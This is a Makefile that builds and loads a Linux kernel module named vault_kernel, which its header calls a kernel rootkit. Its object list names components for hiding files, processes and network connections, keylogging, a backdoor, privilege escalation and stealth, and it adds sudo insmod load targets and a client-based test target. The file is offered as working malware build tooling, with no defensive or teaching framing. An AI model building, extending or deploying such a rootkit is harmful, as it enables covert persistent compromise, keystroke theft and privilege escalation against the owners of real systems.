# vault_kernel - Kernel Rootkit
# ruby570bocadito © 2026
#
# Build: make
# Load:  sudo insmod vault_kernel.ko
# Unload: sudo rmmod vault_kernel

# KERNEL can be overridden for containerized builds, e.g.:
#   make KERNEL=$(ls /lib/modules | head -1)
KERNEL ?= $(shell uname -r)
MODNAME := vault_kernel
KDIR := /lib/modules/$(KERNEL)/build
PWD := $(shell pwd)

obj-m += $(MODNAME).o

$(MODNAME)-objs := main.o \
	hooking.o \
	file_hide.o \
	proc_hide.o \
	net_hide.o \
	keylogger.o \
	backdoor.o \
	priv_esc.o \
	stealth.o \
	ioctl.o

ccflags-y := -O2 -Wall \
	-Wno-unused-function \
	-Wno-declaration-after-statement \
	-Wno-unused-variable \
	-Wno-implicit-fallthrough

all: module

module:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	@if [ -d "$(KDIR)" ]; then \
		$(MAKE) -C $(KDIR) M=$(PWD) clean; \
	else \
		echo "[!] No kernel headers at $(KDIR) - removing artifacts manually"; \
	fi
	@rm -f *.o *.ko *.mod.c *.mod *.order *.symvers *.mod.o .*.cmd
	@rm -rf .tmp_versions

purge: clean
	@rm -f Module.symvers modules.order

load: module
	@sudo insmod $(MODNAME).ko && echo "[+] Loaded. Device: /dev/$(MODNAME)"

unload:
	@sudo rmmod $(MODNAME) && echo "[-] Unloaded."

reload: unload load

info:
	modinfo $(MODNAME).ko 2>/dev/null || echo "Module not built yet. Run 'make' first."

dmesg:
	@sudo dmesg | grep "\[vault_kernel\]" | tail -20

test:
	@python3 ../client/vault_kernel_cli.py status

.PHONY: all module clean purge load unload reload info dmesg test
